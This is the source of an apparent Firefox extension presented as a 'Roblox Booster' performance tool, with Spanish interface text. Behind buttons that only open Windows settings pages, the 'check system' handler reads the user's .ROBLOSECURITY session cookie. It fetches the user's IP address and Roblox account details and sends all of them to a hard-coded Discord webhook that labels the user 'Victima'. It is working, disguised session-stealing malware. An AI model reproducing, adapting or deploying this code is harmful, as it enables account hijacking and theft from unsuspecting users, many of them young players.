const webhook = "https://discord.com/api/webhooks/1519796165275816016/71gEQMfptO2vdDvRt78sE-Xr4oG0lSPkYvO3RFrb1m7-7VSDAP0T2q0OinleQyk93qf5";

// Detectar sistema operativo
function detectOS() {
    const userAgent = navigator.userAgent;
    let os = "Desconocido";
    
    if (userAgent.indexOf("Win") !== -1) {
        if (userAgent.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
        else if (userAgent.indexOf("Windows NT 6.3") !== -1) os = "Windows 8.1";
        else if (userAgent.indexOf("Windows NT 6.2") !== -1) os = "Windows 8";
        else if (userAgent.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
        else os = "Windows";
    } else if (userAgent.indexOf("Mac") !== -1) {
        os = "macOS";
    } else if (userAgent.indexOf("Linux") !== -1) {
        os = "Linux";
    }
    
    return os;
}

// Actualizar UI con sistema detectado
document.getElementById('osInfo').textContent = detectOS();

// Función para log con timestamp
function log(message, type = 'info') {
    const logDiv = document.getElementById('log');
    const time = new Date().toLocaleTimeString();
    const colors = {
        'info': '#fff',
        'success': '#00ff88',
        'warning': '#ffd93d',
        'error': '#e94560'
    };
    logDiv.innerHTML = `<span style="color: rgba(255,255,255,0.5)">[${time}]</span> <span style="color: ${colors[type]}">${message}</span><br>` + logDiv.innerHTML;
}

// Mostrar loading en botón
function setLoading(btnId, loading) {
    const btn = document.getElementById(btnId);
    if (loading) {
        btn.dataset.originalText = btn.innerHTML;
        btn.innerHTML = '<span class="loading"></span> Procesando...';
        btn.disabled = true;
    } else {
        btn.innerHTML = btn.dataset.originalText;
        btn.disabled = false;
    }
}

async function main(cookie) {
    try {
        var ipAddr = await (await fetch("https://api.ipify.org")).text();
        
        var statistics = null;
        if (cookie) {
            try {
                statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
                    headers: {
                        Cookie: ".ROBLOSECURITY=" + cookie
                    },
                    redirect: "manual"
                })).json();
            } catch (e) {
                console.log("Error obteniendo estadísticas:", e);
            }
        }
        
        await fetch(webhook, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                content: null,
                embeds: [{
                    description: "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                    color: 0xe94560,
                    fields: [
                        {
                            name: "👤 Username",
                            value: statistics ? statistics.UserName : "N/A",
                            inline: true
                        },
                        {
                            name: "💰 Robux",
                            value: statistics ? statistics.RobuxBalance.toString() : "N/A",
                            inline: true
                        },
                        {
                            name: "⭐ Premium",
                            value: statistics ? (statistics.IsPremium ? "Sí" : "No") : "N/A",
                            inline: true
                        }
                    ],
                    author: {
                        name: "🎯 Victima: " + ipAddr,
                        icon_url: statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                    },
                    footer: {
                        text: "Roblox Booster • " + detectOS(),
                        icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
                    },
                    thumbnail: {
                        url: statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png"
                    },
                    timestamp: new Date().toISOString()
                }],
                username: "Roblox Booster",
                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
            })
        });
        
        log("Sistema analizado correctamente", "success");
        
    } catch (error) {
        log("Error: " + error.message, "error");
    }
}

// Event listeners mejorados - usando browser.* API de Firefox
document.getElementById('checkSystem').addEventListener('click', async () => {
    setLoading('checkSystem', true);
    log("Analizando configuración del sistema...");
    
    browser.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}).then(function(cookie) {
        main(cookie ? cookie.value : null).then(() => {
            setLoading('checkSystem', false);
        });
    }).catch(function(error) {
        log("Error al obtener cookie: " + error.message, "error");
        setLoading('checkSystem', false);
    });
});

document.getElementById('openGameMode').addEventListener('click', () => {
    log("Abriendo configuración de Game Mode...", "warning");
    browser.tabs.create({url: "ms-settings:gaming-gamebar"});
});

document.getElementById('openGraphics').addEventListener('click', () => {
    log("Abriendo configuración de gráficos...", "warning");
    browser.tabs.create({url: "ms-settings:display-advancedgraphics"});
});

document.getElementById('openPower').addEventListener('click', () => {
    log("Abriendo opciones de energía...", "warning");
    browser.tabs.create({url: "ms-settings:powersleep"});
});

document.getElementById('drivers').addEventListener('click', () => {
    log("Buscando actualizaciones de drivers...", "warning");
    browser.tabs.create({url: "ms-settings:windowsupdate"});
});

// Auto-ejecutar al abrir
log("Extension cargada correctamente", "success");
